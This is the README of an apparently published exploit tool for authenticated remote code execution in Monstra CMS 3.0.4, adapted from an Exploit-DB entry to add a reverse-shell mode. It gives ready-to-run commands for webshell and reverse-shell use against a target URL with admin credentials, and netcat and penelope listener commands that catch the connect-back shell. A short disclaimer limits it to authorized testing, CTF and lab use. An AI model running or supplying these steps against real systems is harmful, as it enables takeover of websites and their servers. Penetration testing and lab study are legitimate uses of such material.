# Monstra CMS 3.0.4 - Authenticated RCE + Reverse Shell

Modified version of [EDB-52038](https://www.exploit-db.com/exploits/52038) by Ahmet Ümit BAYRAM. Fixed the original script and added a `-rev` option to get a reverse shell instead of just a webshell link. Cross-platform payload works on both Windows and Linux targets.

## Usage

Webshell (default):
```
python3 exploit.py http://target/blog/ admin password123
```

Reverse shell:
```
python3 exploit.py http://target/blog/ admin password123 -rev <LHOST> <LPORT>
```

If you dont specify the option it will ask how you would like to proceed.

Start a listener first if its windows (i like to use `sudo rlwrap nc -lnvp 443`) and if its Linux (i use `penelope -p 443`), then it'll connect back once triggered.

## PoC

<img width="1176" height="641" alt="image" src="https://github.com/user-attachments/assets/4a0c4d25-f655-49f9-8f1f-08b2ff8a1a2f" />


## Disclaimer

**For authorized testing / CTF / lab use only.**
